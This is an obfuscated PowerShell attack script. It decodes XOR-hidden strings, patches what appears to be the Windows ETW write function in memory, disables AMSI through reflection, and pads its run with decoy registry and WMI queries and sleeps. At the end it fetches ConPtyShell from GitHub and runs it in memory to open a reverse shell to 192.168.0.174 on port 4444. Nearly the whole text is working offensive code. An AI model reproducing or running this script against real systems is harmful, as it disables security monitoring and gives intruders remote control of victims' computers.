$env:Lzo0YgM7 = "eRdjF3MXexd7FzkXcxd7F3sX"
$env:xlgAkeJF = "RBdyF2MXQRd2F3sXYhdyFw=="
$env:DoUDwGaW = "5F24D7D4"
$env:qZkw6FlR = "UhdjF2AXUhdhF3IXeRdjF0AXZRd+F2MXchdDF2UXdhd5F2QXcRdyF2UX"
$env:n2MBA8lV = "UBdyF2MXQxduF2cXchc="
$env:SpteuqIS = "RBduF2QXYxdyF3oXORdaF3YXeRd2F3AXchd6F3IXeRdjFzkXVhdiF2MXeBd6F3YXYxd+F3gXeRc5F1YXehdkF34XQhdjF34XexdkFw=="
$env:L2OTpsl2 = "UBdyF2MXURd+F3IXexdzFw=="
$env:K5znIx1z = "fBdyF2UXeRdyF3sXJBclFw=="
$env:bODTJlZB = "dhd6F2QXfhdeF3kXfhdjF1EXdhd+F3sXchdzFw=="
$env:LVfSuS8t = "UBdyF2MXQRd2F3sXYhdyFw=="

function fAGmcXg($n){$b=[Convert]::FromBase64String([Environment]::GetEnvironmentVariable($n));$r=@();for($i=0;$i -lt $b.Length;$i++){$r+=$b[$i] -bxor 23};[Text.Encoding]::Unicode.GetString([byte[]]$r)}

$gjr = fAGmcXg 'n2MBA8lV'
$gl6 = fAGmcXg 'L2OTpsl2'
$lts = fAGmcXg 'xlgAkeJF'
$sfy = fAGmcXg 'LVfSuS8t'
$kfy = [System.Reflection.BindingFlags]((0x26 -bxor 0x06) + (0xFB -bxor 0xF3))

$wgi = [PSObject].Assembly

try {
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  Start-Sleep -Milliseconds 180
  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -Name ProductName -ErrorAction SilentlyContinue

  try {
    $f20 = fAGmcXg 'K5znIx1z'
    $iq2 = fAGmcXg 'qZkw6FlR'
    $h53 = fAGmcXg 'Lzo0YgM7'
    $code = @"
using System;
using System.Runtime.InteropServices;
public class WZIJGP {
  [DllImport("$f20", EntryPoint="LoadLibraryA")]
  public static extern IntPtr mrzk(string n);
  [DllImport("$f20", EntryPoint="GetProcAddress")]
  public static extern IntPtr mmCf(IntPtr h, string n);
  [DllImport("$f20", EntryPoint="VirtualProtect")]
  public static extern bool msll(IntPtr a, UIntPtr s, uint p, out uint o);
}
"@
    Add-Type -TypeDefinition $code
    $otc = [WZIJGP]::mrzk($h53)
    $hk6 = [WZIJGP]::mmCf($otc, $iq2)
    $civ = 0
    [WZIJGP]::msll($hk6, [uint32]4, 0x40, [ref]$civ) | Out-Null
    $ph = [Environment]::GetEnvironmentVariable("DoUDwGaW")
    $v7k = @()
    for($i=0;$i -lt $ph.Length;$i+=2){
      $v7k += [Convert]::ToByte($ph.Substring($i,2),16) -bxor 23
    }
    [System.Runtime.InteropServices.Marshal]::Copy([byte[]]$v7k, 0, $hk6, 4)
    [WZIJGP]::msll($hk6, [uint32]4, $civ, [ref]$civ) | Out-Null
    Write-Host '[+] Stage 1 OK'
  } catch {
    Write-Host '[!] Stage 1 failed'
  }


  $null = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name ProgramFilesDir -ErrorAction SilentlyContinue
  $null = Test-Path "$env:SystemRoot\System32\kernel32.dll"
  Start-Sleep -Milliseconds 161

  try {
    $kdd = fAGmcXg 'SpteuqIS'
    $t7m = $wgi.$gjr($kdd)
    $z7c = fAGmcXg 'bODTJlZB'
    $t40 = [System.DateTime]::Now.Ticks
    $uly = $t7m.$gl6($z7c, $kfy)
    $uly.$lts($null, $true)
    $pvq = $uly.$sfy($null)
    if ($pvq -eq $true) {
      Write-Host '[+] Stage 2 OK'
    } else {
      Write-Host '[!] Stage 2 failed'
    }
  } catch {
    Write-Host '[!] Stage 2 failed'
  }

  try {
    $k4w = fAGmcXg 'SpteuqIS'
    $kf9 = $wgi.$gjr($k4w)
    if ($kf9 -ne $null) {
      Write-Host '[+] Bypass confirmed'
    } else {
      Write-Host '[!] Bypass failed'
    }
  } catch {
    Write-Host '[!] Bypass failed'
  }

  Start-Sleep -Milliseconds 152
  $null = Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty Caption
  $null = (Get-WmiObject Win32_Processor).Name
  $null = [Environment]::ProcessorCount
}
finally {
  Remove-Item Env:\n2MBA8lV -ErrorAction SilentlyContinue
  Remove-Item Env:\L2OTpsl2 -ErrorAction SilentlyContinue
  Remove-Item Env:\xlgAkeJF -ErrorAction SilentlyContinue
  Remove-Item Env:\LVfSuS8t -ErrorAction SilentlyContinue
  Remove-Item Env:\SpteuqIS -ErrorAction SilentlyContinue
  Remove-Item Env:\bODTJlZB -ErrorAction SilentlyContinue
  Remove-Item Env:\qZkw6FlR -ErrorAction SilentlyContinue
  Remove-Item Env:\Lzo0YgM7 -ErrorAction SilentlyContinue
  Remove-Item Env:\K5znIx1z -ErrorAction SilentlyContinue
  Remove-Item Env:\DoUDwGaW -ErrorAction SilentlyContinue
}
    # ConPtyShell execution
    try {
        IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.0.174 4444
    } catch {
        Write-Host "[!] ConPtyShell execution failed"
    }
    